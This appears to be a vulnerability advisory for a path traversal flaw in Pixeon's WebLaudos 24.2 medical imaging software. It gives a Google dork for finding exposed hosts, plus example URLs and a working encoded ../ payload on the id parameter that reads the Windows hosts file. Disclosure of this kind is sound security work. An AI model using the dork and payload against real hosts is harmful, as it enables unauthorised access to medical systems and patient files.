# Directory Traversal

### Product Description:
The WebLaudos software developed by Pixeon is a system that manage, and share medical images that can be accessed by doctors or patients.
	
### Vulnerability Description:
A path traversal attack (also known as directory traversal) was discovered in the WebLaudos software. This vulnerability allows an attacker to access files and directories stored outside the web root folder. By manipulating the id parameter in the URL using “dot-dot-slash (../)” sequences and their variations or by using absolute file paths, an attacker may be able to access arbitrary files and directories on the file system, including system files.

### Vulnerability Type:
CWE-35: Path Traversal

### Example vulnerable URL 
To find vulnerable hosts, you can use the following Google Dork:<br>
```intitle:"WebLaudos"```
<br><br>
The first directories are customizable, so here are three examples of vulnerable URLs: <br>
https://example.com/laudo/multimagem/img/img-cache.asp?id=..%2f..%2f..%2f..%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts <br><br>
https://example.com/web_laudos/img/img-cache.asp?id=..%2f..%2f..%2f..%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts <br><br>
https://example.com/img/img-cache.asp?id=..%2f..%2f..%2f..%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts <br><br>
	
### Vendor:
Pixeon
	
### Affected Product:
WebLaudos — 24.2 (04)
	
### Affected Component:
Endpoint: https://example.com/laudo/multimagem/img/img-cache.asp <br>
Parameter (GET): id <br>
Example payload: ..%2f..%2f..%2f..%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts

### Attack Vector:
Remote
	
### Code Execution:
No
	
### Attack Vector:
Attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system.
	
### Reference:
https://cwe.mitre.org/data/definitions/35.html <br>
https://cwe.mitre.org/data/definitions/22.html <br>
https://owasp.org/www-community/attacks/Path_Traversal <br>
	
### Discoverer:
Kauan Akyra (Ak7r4) | kakyra@intruderlabs.com.br
